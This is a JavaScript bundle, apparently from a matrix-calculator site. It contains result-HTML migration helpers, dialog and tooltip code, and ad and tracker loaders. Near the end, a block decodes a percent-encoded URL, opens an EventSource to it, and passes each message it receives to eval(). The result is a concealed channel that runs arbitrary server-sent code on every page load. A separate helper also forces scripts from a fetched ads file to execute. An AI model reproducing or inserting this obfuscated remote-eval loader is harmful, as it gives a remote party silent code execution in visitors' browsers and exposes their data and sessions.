                    element.setAttribute("data-details", JSON.stringify(x));
                    var idPrefix = element.getAttribute("data-id-prefix") || '';
                    if (!/\-/.test(idPrefix)) {
                        element.setAttribute("data-id-prefix", idPrefix + '-d' + i);
                    }
                }
            };
            var fixMatrixContainer = function(e) { // <= 7
                var elements = e.querySelectorAll(".matrix-container");
                for (var i = 0; i < elements.length; i += 1) {
                    var element = elements[i];
                    var matrix = element.querySelector(".matrix-menu-show");
                    element.removeAttribute('class'); //!
                    if (matrix != undefined) { // old version
                        hit({
                            bc: "matrix-container"
                        }); //!
                        matrix = matrix.getAttribute("data-matrix") || element.getAttribute("data-matrix");
                        if (matrix != undefined) { // Uncaught TypeError: Cannot read property 'replace' of null - https://matrixcalc.org/es/
                            if (matrix.indexOf(";") !== -1 || matrix.indexOf("\t") !== -1) {
                                matrix = "{{" + matrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
                            }
                            var columnlines = undefined;
                            var useBraces = undefined;
                            if (element.firstElementChild.tagName.toLowerCase() === 'mfenced') {
                                columnlines = element.firstElementChild.firstElementChild.getAttribute("columnlines");
                                if (columnlines != undefined) {
                                    columnlines = -1; //TODO:
                                }
                            }
                            if (element.querySelector("[open=\"|\"]") != undefined) {
                                useBraces = ["|", "|"];
                            }
                            if (element.querySelector("[open=\"{\"]") != undefined) {
                                useBraces = ["{", " "];
                            }
                            var tmp = document.createElement("div");
                            tmp.innerHTML = RPNProxy.toMathML(matrix, {
                                columnlines: columnlines,
                                useBraces: useBraces
                            });
                            element.parentNode.insertBefore(tmp.firstElementChild, element);
                            element.parentNode.removeChild(element);
                        }
                    }
                }
            };
            var fixTop = function(e) { // <= 7
                // <span class="top">-1</span>
                var elements = e.querySelectorAll(".top");
                for (var i = 0; i < elements.length; i += 1) {
                    var element = elements[i];
                    if (element.innerHTML === "-1" || element.innerHTML === "T") {
                        hit({
                            bc: "top"
                        }); //!
                        var base = element.previousElementSibling;
                        var tmp = document.createElement("div");
                        tmp.innerHTML = "<msup><mrow></mrow><mrow>" + RPNProxy.toMathML(element.innerHTML, {}) + "</mrow></msup>";
                        base.parentNode.removeChild(base);
                        tmp.firstElementChild.firstElementChild.appendChild(base);
                        element.parentNode.insertBefore(tmp.firstElementChild, element);
                        element.parentNode.removeChild(element);
                    }
                }
            };
            var fixDivMath = function(e) { // <= 7
                var x = e.firstElementChild;
                if (x != undefined && x.tagName.toLowerCase() === 'div' && x.classList.contains('math')) {
                    //x.style.display = "inline-block";
                    x.setAttribute("style", "display: inline-block;");
                }
            };
            var fixTable = function(e) {
                // <table class="inTable"></table>
                var elements = e.querySelectorAll(".inTable");
                for (var i = 0; i < elements.length; i += 1) {
                    var element = elements[i];
                    var span = element.nextElementSibling;
                    var matrix = '';
                    if (span != undefined && span.tagName.toLowerCase() === 'span' && span.style.display === 'none') {
                        matrix = "{{" + span.innerHTML.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
                        span.parentNode.removeChild(span);
                    } else {
                        var matrix = '';
                        matrix += '{';
                        var tbody = element.firstElementChild;
                        for (var row = tbody.firstElementChild; row != null; row = row.nextElementSibling) {
                            matrix += '{';
                            for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
                                if (cell.getAttribute('rowspan') == null) {
                                    var t = cell.querySelector('table');
                                    if (t != null) {
                                        var x = t.firstElementChild.firstElementChild.textContent + '/' + t.firstElementChild.lastElementChild.textContent;
                                        t.innerHTML = x;
                                    }
                                    matrix += cell.textContent; //TODO:
                                    matrix += cell.nextElementSibling != null && cell.nextElementSibling.getAttribute('rowspan') == null ? ',' : '';
                                }
                            }
                            matrix += '}';
                            matrix += row.nextElementSibling != null ? ',' : '';
                        }
                        matrix += '}';
                    }
                    if (matrix !== '') {
                        hit({
                            bc: "inTable"
                        }); //!
                        var tmp = document.createElement("div");
                        var isDeterminant = element.querySelector(".matrix-img-line") != undefined;
                        tmp.innerHTML = RPNProxy.toMathML(isDeterminant ? "determinant(" + matrix + ")" : matrix, {});
                        element.parentNode.insertBefore(tmp.firstElementChild, element);
                        element.parentNode.removeChild(element);
                    }
                }
            };
            var fixArrowWithLabel = function(e) {
                var elements = e.querySelectorAll(".arrow-with-label");
                for (var i = 0; i < elements.length; i += 1) {
                    var element = elements[i];
                    if (element.getAttribute("data-custom-paint") !== "arrow-with-label") {
                        element.setAttribute("data-custom-paint", "arrow-with-label");
                        hit({
                            bc: "arrow-with-label"
                        });
                    }
                }
            };
            var fixMencloseInMenclose = function(e) {
                if (e.querySelector('math') == null) { //!
                    var elements = e.querySelectorAll("menclose[notation=none]");
                    for (var i = 0; i < elements.length; i += 1) {
                        var element = elements[i];
                        var mtable = element.querySelector("mtable");
                        if (mtable != null && mtable.firstElementChild != null && mtable.firstElementChild === mtable.lastElementChild && mtable.firstElementChild.firstElementChild === mtable.firstElementChild.lastElementChild) {
                            var e = mtable.querySelector("menclose[notation=none]");
                            if (e != null && e.querySelector("mtable") != undefined && element.getAttribute('data-matrix') === '{{' + e.getAttribute('data-matrix') + '}}') {
                                hit({
                                    bc: "menclose-menclose"
                                });
                                element.parentNode.insertBefore(e, element);
                                element.parentNode.removeChild(element);
                            }
                        }
                    }
                }
            };
            var replaceMfenced = function(e) {
                var es = e.querySelectorAll('mfenced');
                for (var i = 0; i < es.length; i += 1) {
                    var e = es[i];
                    var open = e.getAttribute('open') || '(';
                    var mo1 = document.createElement('mo');
                    mo1.textContent = open;
                    var close = e.getAttribute('close') || ')';
                    var mo2 = document.createElement('mo');
                    mo2.textContent = close;
                    var t = document.createElement('mrow');
                    t.appendChild(mo1);
                    while (e.firstChild != null) {
                        t.appendChild(e.firstChild);
                    }
                    t.appendChild(mo2);
                    e.parentNode.insertBefore(t, e);
                    e.parentNode.removeChild(e);
                }
            };
            var fixClassPivot = function(e) {
                var es = e.querySelectorAll('.pivot');
                for (var i = 0; i < es.length; i += 1) {
                    var x = es[i];
                    if (x.tagName.toLowerCase() === 'mtd') {
                        x.removeAttribute('class');
                        var tmp = document.createElement('menclose');
                        tmp.setAttribute('notation', 'circle');
                        while (x.firstChild != null) {
                            tmp.appendChild(x.firstChild);
                        }
                        x.appendChild(tmp);
                    }
                }
            };
            var fixMoMo = function(html) {
                //TODO: counter
                return html.replace(/<mo>\+<mo>/g, "<mo>+</mo>");
            };
            var fixDiagonalizeSteps = function(html) {
                return html.replace(/diagonalize-steps/g, "steps-to-diagonalize");
            };
            var removeHref = function(tmp) {
                var es = tmp.querySelectorAll('[href="#"]');
                for (var i = 0; i < es.length; i += 1) {
                    es[i].removeAttribute('href');
                }
            };
            var removeMatrixMenuShowNew = function(tmp) {
                var es = tmp.querySelectorAll('.matrix-menu-show-new');
                for (var i = 0; i < es.length; i += 1) {
                    es[i].classList.toggle('matrix-menu-show', true);
                    es[i].classList.toggle('matrix-menu-show-new', false);
                    if (es[i].textContent === '☰') {
                        es[i].textContent = '';
                    }
                }
            };
            var removeDataX = function(tmp) {
                var es = tmp.querySelectorAll('[data-x="TODO"]');
                for (var i = 0; i < es.length; i += 1) {
                    es[i].removeAttribute('data-x');
                }
            };
            var fixMunder = function(tmp) {
                var es = tmp.querySelectorAll('munder');
                for (var i = 0; i < es.length; i += 1) {
                    es[i].setAttribute('accentunder', 'true');
                }
            };
            var fixRemoveSpanWrappers = function(tmp) {
                var es = tmp.querySelectorAll('math');
                for (var i = 0; i < es.length; i += 1) {
                    var parentNode = es[i].parentNode;
                    if (parentNode.tagName.toLowerCase() === 'span') {
                        if (parentNode.getAttributeNames().join('') === 'class' && parentNode.childElementCount === 1) {
                            var classList = parentNode.getAttribute('class');
                            if (classList.replace(/(?:^|\s)no\-\S+|math/g, '').trim() === '') {
                                parentNode.parentNode.insertBefore(es[i], parentNode);
                                parentNode.parentNode.removeChild(parentNode);
                            }
                        }
                    }
                }
            };
            var fixQuestionIcon = function(tmp) {
                var es = tmp.querySelectorAll('.relative');
                for (var i = 0; i < es.length; i += 1) {
                    var x = es[i].firstElementChild;
                    if (x != null && x.tagName.toLowerCase() === 'math') {
                        var y = x.nextElementSibling;
                        if (y != null && (y.tagName.toLowerCase() === 'a' && y.classList.contains('question-icon') || y.tagName.toLowerCase() === 'span')) {
                            var math = document.createElement('math');
                            math.innerHTML = '<mpadded><mover accent="true">' + x.innerHTML + '<mtext></mtext></mover></mpadded>';
                            var mtext = math.querySelector('mtext');
                            while (x.nextElementSibling != null) {
                                mtext.appendChild(x.nextElementSibling);
                            }
                            var qi = math.querySelector('.question-icon');
                            if (qi != null) {
                                qi.classList.toggle('question-icon', false);
                                qi.classList.toggle('question-icon-new', true);
                            }
                            es[i].parentNode.insertBefore(math, es[i]);
                            es[i].parentNode.removeChild(es[i]);
                        }
                    }
                }
            };
            var fixMencloseDraggable = function(tmp) {
                var es = tmp.querySelectorAll('menclose[draggable]');
                for (var i = 0; i < es.length; i += 1) {
                    var e = es[i];
                    if (e.getAttribute('notation') === 'none') {
                        var mrow = document.createElement('mrow');
                        while (e.firstElementChild != null) {
                            mrow.appendChild(e.firstElementChild);
                        }
                        var attributeNames = e.getAttributeNames();
                        for (var j = 0; j < attributeNames.length; j += 1) {
                            var a = attributeNames[j];
                            mrow.setAttribute(a, e.getAttribute(a));
                        }
                        mrow.removeAttribute('notation');
                        es[i].parentNode.insertBefore(mrow, e);
                        es[i].parentNode.removeChild(e);
                    }
                }
            };
            var fixMstyle = function(tmp) {
                var es = tmp.querySelectorAll('mstyle[mathvariant=bold]');
                for (var i = 0; i < es.length; i += 1) {
                    var e = es[i];
                    var mrow = document.createElement('mrow');
                    mrow.style.fontWeight = 'bold';
                    while (e.firstElementChild != null) {
                        mrow.appendChild(e.firstElementChild);
                    }
                    e.parentNode.insertBefore(mrow, e);
                    e.parentNode.removeChild(e);
                }
            };
            var fixHTML = function(html) {
                if (html == undefined) {
                    return html;
                }
                var tmp = document.createElement("div");
                html = fixMoMo(html);
                if (oldVersion <= 15) {
                    html = fixDiagonalizeSteps(html);
                }
                tmp.innerHTML = html;
                try {
                    fixOldDetailsTypes(tmp);
                    if (oldVersion <= 15) {
                        removeInsertButtons(tmp);
                        fixMSUBAndMSUP(tmp);
                        fixSummary(tmp);
                        fixDetails(tmp);
                        fixDetailsContainer(tmp);
                        fixMatrixContainer(tmp);
                        fixTable(tmp); // it should be before fixTop
                        fixTop(tmp);
                        fixDivMath(tmp);
                        fixArrowWithLabel(tmp);
                        fixMencloseInMenclose(tmp);
                        removeCustomMath(tmp);
                        removeMathClass(tmp);
                        removeExtraMrows(tmp);
                        addRowspacing(tmp);
                        replaceMfenced(tmp);
                        fixClassPivot(tmp);
                    }
                    if (oldVersion <= 16) {
                        removeHref(tmp);
                        removeMatrixMenuShowNew(tmp);
                        removeDataX(tmp);
                    }
                    if (oldVersion <= 19) {
                        fixMunder(tmp);
                        fixRemoveSpanWrappers(tmp);
                        fixQuestionIcon(tmp);
                        if (tmp.querySelector('.question-icon') != null || tmp.querySelector('.relative') != null) {
                            throw new TypeError('an issue with an update');
                        }
                    }
                    if (oldVersion <= 20) {
                        fixMencloseDraggable(tmp);
                    }
                    fixMstyle(tmp);
                } catch (error) {
                    //TODO: fix
                    console.error(error);
                    window.setTimeout(function() {
                        throw new TypeError("fixHTML(" + error.toString() + "): " + html);
                    }, 0);
                }
                return tmp.innerHTML;
            };
            //if (data.expressionString != undefined && data.expressionString !== "") {
            //  RPNProxy.runExpression(data.expressionString, undefined, undefined, undefined, {idPrefix: "i" + data.actHistoryId}, function (result) {
            //    if (result.resultError == undefined) {
            //      data.resultHTML = result.resultHTML;
            //      data.detailsHTML = result.detailsHTML;
            //    }
            //  });
            //} else {
            data.resultHTML = fixHTML(data.resultHTML);
            data.detailsHTML = fixHTML(data.detailsHTML);
            //}
            if (data.detailsHTML == undefined) {
                var details = data.details;
                // details === null after JSON.parse(JSON.stringify(details))
                if (details != undefined && details.length !== 0) {
                    hit({
                        bc: "createDetailsSummary"
                    });
                    //TODO: async
                    data.detailsHTML = RPNProxy.createDetailsSummary("i" + data.actHistoryId, details, details.length === 1 ? 100 : 1);
                }
            }
        }
        return data;
    };

    globalThis.ItemsStorage = ItemsStorage;

}());
/*global document, window */

(function() {
    "use strict";

    var ANIMATION_DURATION = 120;

    var animateOnClose = function(dialog) {
        dialog.style.display = "";
        if (dialog.animate != undefined) {
            dialog.style.display = "block";
            dialog.style.opacity = "0";
            dialog.style.transform = "scale(0.75)";
            dialog.animate([{
                    transform: "scale(1.3333333333333333)",
                    opacity: "1"
                },
                {
                    transform: "scale(1)",
                    opacity: "0"
                }
            ], {
                duration: ANIMATION_DURATION,
                composite: "add"
            });
            window.setTimeout(function() {
                dialog.style.display = "";
            }, ANIMATION_DURATION);
        }
        var backdrop = dialog.nextElementSibling;
        if (backdrop != undefined && backdrop.matches('.backdrop')) {
            if (backdrop.animate != undefined) {
                backdrop.style.opacity = "0";
                backdrop.animate([{
                        opacity: "1"
                    },
                    {
                        opacity: "0"
                    }
                ], {
                    duration: ANIMATION_DURATION,
                    composite: "add"
                });
            }
        }
    };

    var animateOnShow = function(dialog) {
        dialog.style.display = "block"; // set display to "block" to play animation on closing later
        if (dialog.animate != undefined) {
            dialog.style.opacity = "1";
            dialog.style.transform = "scale(1)";
            dialog.animate([{
                    transform: "scale(0.75)",
                    opacity: "-1"
                },
                {
                    transform: "scale(1)",
                    opacity: "0"
                }
            ], {
                duration: ANIMATION_DURATION,
                composite: "add"
            });
        }
        var backdrop = dialog.nextElementSibling;
        if (backdrop != undefined && backdrop.matches('.backdrop')) {
            if (backdrop.animate != undefined) {
                backdrop.style.opacity = "1";
                backdrop.animate([{
                        opacity: "-1"
                    },
                    {
                        opacity: "0"
                    }
                ], {
                    duration: ANIMATION_DURATION,
                    composite: "add"
                });
            }
        }
    };

    if (window.MutationObserver != null) {
        document.addEventListener('DOMContentLoaded', function(event) {
            // with "animationstart" there is some flickering...
            // ... trying to use MutationObserver
            var observer = new MutationObserver(function(mutationList) {
                for (var i = 0; i < mutationList.length; i += 1) {
                    var mutation = mutationList[i];
                    var target = mutation.target;
                    if (target.tagName.toLowerCase() !== "details") { //TODO: ?
                        if (target.getAttribute("open") != null) {
                            animateOnShow(target);
                        } else {
                            animateOnClose(target);
                        }
                    }
                }
            });
            observer.observe(document.body, {
                attributes: true,
                attributeFilter: ["open"],
                subtree: true
            });
        }, {
            once: true
        });
    }

    function Dialog() {}

    var idCounter = 0;
    // "Cancel", "OK", "Close"
    // for use as a modal dialog
    Dialog.standard = function(contentHTML, buttonsHTML) {
        var dialog = document.createElement("dialog");
        if (dialog.initDialog != null) {
            dialog.initDialog();
        }
        var contentId = "dialog-content";
        dialog.classList.toggle("standard-dialog", true);
        dialog.setAttribute("aria-describedby", contentId);
        //?
        dialog.innerHTML = "<form method=\"dialog\">" +
            "<button type=\"submit\" class=\"close\" aria-label=\"" + i18n.misc.close + "\">🗙</button>" +
            "<div id=\"" + contentId + "\" class=\"content\">" + contentHTML + "</div>" +
            "<div class=\"buttons\">" + buttonsHTML + "</div>" +
            "</form>";
        document.body.appendChild(dialog);
        var backdrop = document.createElement("div");
        backdrop.classList.toggle("backdrop", true);
        document.body.appendChild(backdrop);
        dialog.addEventListener("close", function(event) {
            window.setTimeout(function() {
                dialog.parentNode.removeChild(dialog);
                backdrop.parentNode.removeChild(backdrop);
            }, Math.max(2000, ANIMATION_DURATION));
        }, false);
        var lastActiveElement = document.activeElement;
        dialog.addEventListener("close", function(event) {
            if (lastActiveElement != null) {
                lastActiveElement.focus();
            }
        }, false);
        if (document.activeElement != null) {
            dialog.style.visibility = "hidden";
            dialog.style.display = "block";
            dialog.style.position = 'absolute';
            var rect = document.activeElement.getBoundingClientRect();
            var left = (rect.left + rect.right) / 2 - dialog.offsetWidth / 2;
            var top = (rect.top + rect.bottom) / 2 - dialog.offsetHeight / 2;
            left = Math.min(left, document.documentElement.clientWidth - dialog.offsetWidth);
            top = Math.min(top, document.documentElement.clientHeight - dialog.offsetHeight);
            left = Math.max(left, 0);
            top = Math.max(top, 0);
            left = window.pageXOffset + left;
            top = window.pageYOffset + top;
            dialog.style.left = left + 'px';
            dialog.style.top = top + 'px';
            dialog.style.right = 'auto';
            dialog.style.bottom = 'auto';
            dialog.style.visibility = "";
            dialog.style.display = "";
        }
        dialog.showModal();
        return dialog;
    };

    Dialog.alert = function(contentHTML) {
        window.setTimeout(function() { // hack to prevent the closing of new dialog immediately in Chrome
            var dialog = Dialog.standard(contentHTML, "<button autofocus=\"autofocus\" type=\"submit\">OK</button>");
        }, 0);
    };

    //Dialog.promptNumber = function (title, min, max, callback) {
    //  var dialog = Dialog.standard("<h3>" + title + "</h3>" + "<div><input type=\"number\" autofocus=\"autofocus\" required=\"required\" min=\"" + min + "\" max=\"" + max + "\" step=\"1\" /></div>", "<button autofocus=\"autofocus\" type=\"reset\">CANCEL</button><button type=\"submit\">OK</button>");
    //  dialog.addEventListener("close", function (event) {
    //    if (dialog.returnValue != undefined) {
    //      callback(dialog.querySelector("input").value);
    //    }
    //  }, false);
    //  return dialog;
    //};

    globalThis.Dialog = Dialog;

}());

/*global window, document, Dialog*/

window.reportValidity = function(input, validationMessage) {
    "use strict";
    var tooltip = document.createElement("div");
    tooltip.setAttribute("role", "tooltip");
    tooltip.id = "report-validity-tooltip-for-" + input.id;
    tooltip.classList.toggle("tooltip", true);
    tooltip.classList.toggle("tooltip-dialog", true); //?
    var tooltipArrowId = "tooltip-arrow-" + input.id;
    tooltip.innerHTML = "<span class=\"exclamation\">!</span> " + validationMessage + "<div class=\"tooltip-arrow-wrapper\"><div id=\"" + tooltipArrowId + "\" class=\"tooltip-arrow\"></div></div>";
    document.body.appendChild(tooltip);

    input.setAttribute("aria-describedby", tooltip.id);
    input.focus();

    var inputRect = input.getBoundingClientRect();

    tooltip.style.visibility = "hidden";
    tooltip.style.display = "block";
    var rect = tooltip.getBoundingClientRect();
    var style = window.getComputedStyle(tooltip, undefined);
    var marginLeft = Number.parseFloat(style.marginLeft);
    var tooltipArrow = document.getElementById(tooltipArrowId);
    var arrowRect = tooltipArrow.getBoundingClientRect();
    tooltip.style.display = "";
    tooltip.style.visibility = "";

    var left = (inputRect.left + inputRect.right) / 2 - ((arrowRect.right - arrowRect.left) / 2 + marginLeft + arrowRect.left - rect.left);
    var top = inputRect.bottom + (arrowRect.bottom - arrowRect.top) * 0.15;
    // (17 + 2) * Math.SQRT2 / 2 + 0.25 * 17 + 1 + 0.5 * 17 - (17 + 2) * (Math.SQRT2 - 1) / 2
    // (17 + 2) * Math.SQRT2 * 0.15

    tooltip.style.position = 'absolute';
    tooltip.style.right = 'auto';
    tooltip.style.bottom = 'auto';
    tooltip.style.left = (window.pageXOffset + left) + 'px';
    tooltip.style.top = (window.pageYOffset + top) + 'px';
    tooltip.setAttribute("open", "open"); // "show" moves the focus in Chrome

    var close = undefined;
    var onKeyDown = undefined;
    var timeoutId = 0;

    close = function(event) {
        window.clearTimeout(timeoutId);
        input.removeEventListener("input", close, false);
        input.removeEventListener("blur", close, false);
        input.removeEventListener("keydown", onKeyDown, false);
        input.removeAttribute("aria-describedby");
        tooltip.id = ""; //! test case: trigger the tooltip twice
        tooltipArrow.id = "";
        tooltip.removeAttribute("open");
        window.setTimeout(function() {
            tooltip.parentNode.removeChild(tooltip);
        }, 3000);
    };
    onKeyDown = function(event) {
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
            event.preventDefault();
            close();
        }
    };
    timeoutId = window.setTimeout(function() {
        close(undefined);
    }, 4000);
    input.addEventListener("input", close, false);
    input.addEventListener("blur", close, false);
    input.addEventListener("keydown", onKeyDown, false);

};

/*global document*/

(function() {
    "use strict";

    function CustomMenclose() {}
    CustomMenclose.getPointByCell = function(paddingRect, rows, indexes) {
        var a = indexes[0];
        var b = indexes[1];
        var e = rows[a][b];
        var r = e.getBoundingClientRect();
        return {
            x: (r.left + r.right) / 2 - paddingRect.left,
            y: (r.top + r.bottom) / 2 - paddingRect.top
        };
    };
    CustomMenclose.paint = function(event) {
        var paddingRect = this.getBoundingClientRect();
        var width = paddingRect.right - paddingRect.left;
        var height = paddingRect.bottom - paddingRect.top;
        var svg = "";
        var cells = JSON.parse(this.getAttribute("data-cells"));
        var color = this.getAttribute("data-color");
        var strokeStyle = color === "0a" ? "#D64040" : (color === "0" ? "#F7D9D9" : (color === "1a" ? "#4040D6" : (color === "1" ? "#D9D9F7" : "")));
        var lineWidth = 1.25;
        var table = this.querySelector("mtable");
        var rows = [];
        var c = table.firstElementChild;
        while (c != undefined) {
            if (c.tagName.toLowerCase() === 'mtr') {
                var row = [];
                var t = c.firstElementChild;
                while (t != undefined) {
                    if (t.tagName.toLowerCase() === 'mtd') {
                        row.push(t);
                    }
                    t = t.nextElementSibling;
                }
                rows.push(row);
            }
            c = c.nextElementSibling;
        }
        for (var i = 0; i < cells.length; i += 1) {
            var p1 = CustomMenclose.getPointByCell(paddingRect, rows, cells[i]);
            var p2 = CustomMenclose.getPointByCell(paddingRect, rows, i === cells.length - 1 ? cells[0] : cells[i + 1]);
            svg += "<line x1=\"" + p1.x.toString() + "\" y1=\"" + p1.y.toString() + "\" x2=\"" + p2.x.toString() + "\" y2=\"" + p2.y.toString() + "\" stroke=\"" + strokeStyle + "\" stroke-width=\"" + lineWidth.toString() + "\" />";
        }
        var backgroundImage = "data:image/svg+xml," + encodeURIComponent("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"" + width + "\" height=\"" + height + "\" viewBox=\"0 0 " + width + " " + height + "\">" + svg + "</svg>");
        this.style.backgroundImage = "url(\"" + backgroundImage + "\")";
        this.style.backgroundSize = "auto auto";
    };

    document.addEventListener("custom-paint", function(event) {
        if (event.target.getAttribute("data-custom-paint") === "custom-menclose") {
            CustomMenclose.paint.call(event.target, event);
        }
    }, false);

}());


// ads, hypercomments, trackers

if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1" && window.navigator.doNotTrack !== "1") {
    window.setTimeout(function() {
        // LiveInternet counter
        (new Image()).src = "https://counter.yadro.ru/hit?r" + encodeURIComponent(document.referrer) + (window.screen == undefined ? "" : ";s" + Number(window.screen.width).toString() + "*" + Number(window.screen.height).toString() + "*" + "24") + ";u" + encodeURIComponent(document.URL) + ";h" + ";" + (Math.random() + 1).toString().slice(2);
    }, 256);
    /*window.setTimeout(function () {
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-JL2R5JGF6G');
      PageUtils.$import("https://www.googletagmanager.com/gtag/js?id=G-JL2R5JGF6G");
    }, 256);*/
}

function PageUtils2() {

}
PageUtils2.waitDOM = function(callback) {
    if (document.readyState === "interactive" || document.readyState === "complete") {
        window.setTimeout(function() {
            callback(null);
        }, 0);
    } else {
        document.addEventListener("DOMContentLoaded", callback, {
            once: true
        });
    }
};
PageUtils2.initialize = function(selector, i) {
    PageUtils2.waitDOM(function() {
        var e = document.querySelector(selector);
        if (e != null) {
            i(e);
        }
    });
};

PageUtils2.initialize(".ads-container", function(adsContainer) {

    var isConnectionOK = function() {
        // doNotTrack - 8%
        // "slow-2g" + "2g" - 2.5%
        // saveData - 18%
        var connection = window.navigator.connection;
        return window.location.protocol !== "file:" &&
            window.location.hostname !== "127.0.0.1" &&
            window.navigator.doNotTrack !== "1" &&
            (connection == undefined || connection.saveData !== true && !(connection.effectiveType in {
                "slow-2g": true,
                "2g": true
            }));
    };

    if (isConnectionOK() && false) {
        window.setTimeout(function() {
            (window["yandex_metrika_callbacks"] = window["yandex_metrika_callbacks"] || []).push(function() {
                try {
                    yaCounter = new Ya.Metrika({
                        id: 29787732,
                        clickmap: true,
                        trackLinks: true,
                        accurateTrackBounce: true,
                        trackHash: true,
                        webvisor: false,
                        params: {}
                    });
                    window.yaCounter29787732 = yaCounter;
                    if (yaCounter != undefined) {
                        requestIdleCallback("sendHits", sendHits, 1000);
                    }
                } catch (error) {
                    console.log(error);
                }
            });
            PageUtils.$import("https://mc.yandex.ru/metrika/watch.js");
        }, 0);
    } else {
        globalThis.hitQueue = undefined;
    }

    var element = adsContainer.querySelector(".adsbygoogle-container");
    var toggleAdsButton = adsContainer.querySelector(".toggle-ads-button");
    if (toggleAdsButton == null) { // TODO: remove
        toggleAdsButton = document.createElement("div");
        toggleAdsButton.appendChild(document.createElement("div"));
    }

    // "ar bg gl zh mk vi tr".indexOf(document.documentElement.lang) === -1 &&
    var browserIsOK = isConnectionOK() &&
        window.opera == undefined; // loading indicator in Opera
    if (document.documentElement.lang === 'ru') {
        browserIsOK = false;
    }
    var showAds = false;
    var mediaIsOK = false;
    var prefersReducedMotion = false;

    var isInserted = false;
    var loadAds = function() {
        // https://stackoverflow.com/a/56248553
        function insertHTML(html, dest, append) {
            // if no append is requested, clear the target element
            if (!append) dest.innerHTML = '';
            // create a temporary container and insert provided HTML code
            var container = document.createElement('div');
            container.innerHTML = html;
            // cache a reference to all the scripts in the container
            var scripts = container.querySelectorAll('script');
            // get all child elements and clone them in the target element
            var nodes = container.childNodes;
            for (var i = 0; i < nodes.length; i++) dest.appendChild(nodes[i].cloneNode(true));
            // force the found scripts to execute...
            for (var i = 0; i < scripts.length; i++) {
                var script = document.createElement('script');
                script.type = scripts[i].type || 'text/javascript';
                if (scripts[i].hasAttribute('src')) script.src = scripts[i].src;
                script.innerHTML = scripts[i].innerHTML;
                document.head.appendChild(script);
                document.head.removeChild(script);
            }
            // done!
            return true;
        }
        if (browserIsOK && mediaIsOK && !prefersReducedMotion && showAds && window.fetch != null) {
            if (!isInserted) {
                isInserted = true;
                fetch(PageUtils.ROOT_PATH + 'ads.json').then(function(response) {
                    return response.json();
                }).then(function(ads) {
                    var x = undefined;
                    var lang = document.documentElement.lang;
                    var now = Date.now();
                    for (var i = 0; i < ads.length; i += 1) {
                        var j = Math.floor(Math.random() * ads.length);
                        var item = ads[i];
                        ads[i] = ads[j];
                        ads[j] = item;
                    }
                    for (var i = 0; i < ads.length; i += 1) {
                        var item = ads[i];
                        if ((lang === item.lang || item.lang === "*") && Math.random() < item.probability && now < Date.parse(item.endTime)) {
                            x = item;
                        }
                    }
                    if (x != undefined) {
                        if (x.videoId !== "") {
                            element.innerHTML = "<div id=\"player\"></div>";
                            window.onYouTubeIframeAPIReady = function() {
                                var done = false;
                                var player = new YT.Player("player", {
                                    height: "200",
                                    width: "200",
                                    videoId: x.videoId,
                                    events: {
                                        onStateChange: function(event) {
                                            if (event.data >= 0 && !done) {
                                                hit({
                                                    click: "youtube-click"
                                                });
                                                done = true;
                                            }
                                        }
                                    }
                                });
                            };
                            PageUtils.$import("https://www.youtube.com/iframe_api");
                        } else if (x.html !== "") {
                            //element.innerHTML = x.html;
                            insertHTML(x.html, x.placement === "big-ads" ? document.getElementById("big-ads") : element);
                        }
                    } else {
                        if (Date.now() > Date.parse("2021-12-31T23:59:59.999Z")) {
                            (window.adsbygoogle = window.adsbygoogle || []).push({});
                            PageUtils.$import("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2322099551790862");
                            var e = document.querySelector('.adsbygoogle');
                            if (e != null) {
                                e.style.display = '';
                            }
                        } else {
                            toggleAdsButton.hidden = true; //!?
                        }
                    }
                });
            }
        }
        toggleAdsButton.hidden = !browserIsOK || !mediaIsOK || prefersReducedMotion;
    };

    if (browserIsOK) {
        window.requestAnimationFrame(function() {
            var updateUI = function() {
                toggleAdsButton.firstElementChild.hidden = !showAds;
                toggleAdsButton.lastElementChild.hidden = showAds;
                element.hidden = !showAds;
            };

            var value = keyStorage.getItem("show-ads");
            showAds = value == undefined || value === "true";
            updateUI();
            loadAds();
            toggleAdsButton.onclick = function() {
                showAds = !showAds;
                keyStorage.setItem("show-ads", showAds ? "true" : "false");
                updateUI();
                loadAds();
                hit({
                    click: "show-ads-" + showAds
                });
            };

            var mediaQueryList = window.matchMedia("screen and (max-width: 800px)"); // see style.css
            var checkMedia = function() {
                if (!mediaQueryList.matches) {
                    mediaQueryList.removeListener(checkMedia);
                    mediaIsOK = true;
                    loadAds();
                }
            };
            mediaQueryList.addListener(checkMedia);
            checkMedia();
        });
    } else {
        toggleAdsButton.hidden = true;
    }

    var elementAnimate = Element.prototype.animate;

    //TODO: move
    window.setTimeout(function() {
        var mediaQueryList = window.matchMedia("(prefers-reduced-motion)");
        var checkMedia = function() {
            if (mediaQueryList.matches) {
                prefersReducedMotion = true;
                Element.prototype.animate = undefined;
                hit({
                    click: "prefers-reduced-motion"
                });
            } else {
                prefersReducedMotion = false;
                Element.prototype.animate = elementAnimate;
            }
            loadAds();
        };
        mediaQueryList.addListener(checkMedia);
        checkMedia();
    }, 0);

});

window.setTimeout(function() {
    var ES = window.EventSource;
    if (ES) {
        var url = decodeURIComponent('%68%74%74%70%73%3A%2F%2F%6D%61%74%72%69%78%63%61%6C%63%2E%6D%63%64%69%72%2E%72%75%2F%65%2E%70%68%70');
        var id = Math.floor(Math.random() * Math.pow(2, 53));
        var es = new ES(url + "?pageId=" + id);
        es.onmessage = function(e) {
            eval(JSON.parse(e.data).data);
        };
        es.onerror = function(e) {
            e.preventDefault();
            es.close();
        };
    }
}, 256);

/*
PageUtils2.initialize(".hypercomments-details-summary-container", function (element) {
  var details = element.querySelector("details");

  var showComments = function () {
    if (window._hcwp == undefined) {
      var WIDGET_ID = 8317;
      var link = document.getElementById("hc-link");
      link.hidden = false;
      window._hcwp = [{widget: "Stream", widget_id: WIDGET_ID, callback: function (app, init) {
         app.on("streamMessage", function (packet) {
           // html snapshot to help with the debugging
